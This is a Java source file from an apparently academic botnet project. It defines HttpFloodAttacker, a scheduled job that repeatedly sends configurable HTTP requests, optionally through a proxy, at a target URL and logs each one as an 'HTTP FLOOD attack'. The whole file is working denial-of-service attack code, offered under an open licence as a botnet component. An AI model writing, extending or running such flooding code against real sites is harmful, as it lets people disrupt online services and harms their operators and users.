/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.attack.flooding;

import com.acmutv.botnet.core.attack.SchedulableAttacker;
import com.acmutv.botnet.log.AppLogMarkers;
import com.acmutv.botnet.tool.net.HttpManager;
import com.acmutv.botnet.tool.net.HttpMethod;
import com.acmutv.botnet.tool.net.HttpProxy;
import lombok.*;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.quartz.*;

import java.io.IOException;
import java.net.URL;
import java.util.Map;

/**
 * A HTTP attack that can be executed by a {@link Scheduler}.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see HttpFloodAttack
 */
@Getter
@PersistJobDataAfterExecution
@DisallowConcurrentExecution
public class HttpFloodAttacker implements SchedulableAttacker {

  private static final Logger LOGGER = LogManager.getLogger(HttpFloodAttacker.class);

  @Override
  public void execute(JobExecutionContext context) throws JobExecutionException {
    LOGGER.traceEntry();
    //TODO check
    JobDataMap jobmap = context.getJobDetail().getJobDataMap();
    LOGGER.trace("With jobmap {}", jobmap);
    final HttpMethod method = (HttpMethod) jobmap.get("method");
    final URL target = (URL) jobmap.get("target");
    final HttpProxy proxy = (HttpProxy) jobmap.get("proxy");
    @SuppressWarnings("unchecked") final Map<String,String> header = (Map<String,String>) jobmap.get("header");
    @SuppressWarnings("unchecked") final Map<String,String> params = (Map<String,String>) jobmap.get("params");
    final int counter = (int)jobmap.getOrDefault("counter", 1);
    final int executions = jobmap.getInt("executions");

    jobmap.put("counter", counter+1);

    LOGGER.trace("Execution {}", counter);

    LOGGER.info(AppLogMarkers.ATTACK,
        "Launching HTTP FLOOD attack: {} {} ({}/{}) behind proxy {}",
        method, target, counter, executions, (proxy == null)?"none":proxy.toCompactString());

    try {
      final int response = HttpManager.makeRequest(method, target, proxy, header, params);
      LOGGER.trace("HTTP Attack response :: {} {} :: {}", method, target, response);
    } catch (IOException exc) {
      LOGGER.warn(exc.getMessage());
    }
  }
}
